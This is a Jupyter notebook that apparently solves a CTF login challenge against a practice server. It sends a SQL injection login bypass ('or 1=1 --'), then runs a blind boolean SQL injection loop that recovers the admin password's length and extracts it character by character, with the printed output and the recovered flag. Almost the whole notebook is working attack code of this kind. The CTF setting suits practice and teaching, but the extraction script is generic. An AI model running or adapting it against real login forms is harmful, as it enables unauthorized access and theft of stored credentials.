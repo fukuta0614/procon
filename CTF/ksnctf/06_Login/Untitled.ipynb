{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "url = 'http://ctfq.sweetduet.info:10080/~q6/'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [],
   "source": [
    "payload = {\n",
    "#     'id' : \"admin\", \n",
    "    'id' : \"' or 1=1 --\", \n",
    "    'pass': ''\n",
    "}\n",
    "r = requests.post(url, data=payload)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "'Congratulations' in r.content.decode()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "good! 21\n"
     ]
    }
   ],
   "source": [
    "for i in range(1, 101):\n",
    "    query  = \"admin' AND (SELECT LENGTH(pass) FROM user WHERE id = 'admin') = {} --\".format(i)\n",
    "    payload = {\n",
    "    #     'id' : \"admin\", \n",
    "        'id' : query, \n",
    "        'pass': ''\n",
    "    }\n",
    "    r = requests.post(url, data=payload)\n",
    "    \n",
    "    if 'Congratulations' in r.content.decode():\n",
    "        print('good!', i)\n",
    "        break"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "good! 0 F\n",
      "good! 1 L\n",
      "good! 2 A\n",
      "good! 3 G\n",
      "good! 4 _\n",
      "good! 5 K\n",
      "good! 6 p\n",
      "good! 7 W\n",
      "good! 8 a\n",
      "good! 9 4\n",
      "good! 10 j\n",
      "good! 11 i\n",
      "good! 12 3\n",
      "good! 13 u\n",
      "good! 14 Z\n",
      "good! 15 k\n",
      "good! 16 6\n",
      "good! 17 T\n",
      "good! 18 r\n",
      "good! 19 P\n",
      "good! 20 K\n"
     ]
    }
   ],
   "source": [
    "flag = \"\"\n",
    "for i in range(21):\n",
    "    \n",
    "    for c in range(255):\n",
    "        query  = \"admin' AND (SELECT SUBSTR(pass, {}, 1) FROM user WHERE id = 'admin') = '{}' --\".format(i+1, chr(c))\n",
    "        payload = {\n",
    "        #     'id' : \"admin\", \n",
    "            'id' : query, \n",
    "            'pass': ''\n",
    "        }\n",
    "        r = requests.post(url, data=payload)\n",
    "\n",
    "        if 'Congratulations' in r.content.decode():\n",
    "            print('good!', i, chr(c))\n",
    "            flag += chr(c)\n",
    "            break\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'FLAG_KpWa4ji3uZk6TrPK'"
      ]
     },
     "execution_count": 27,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "flag"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
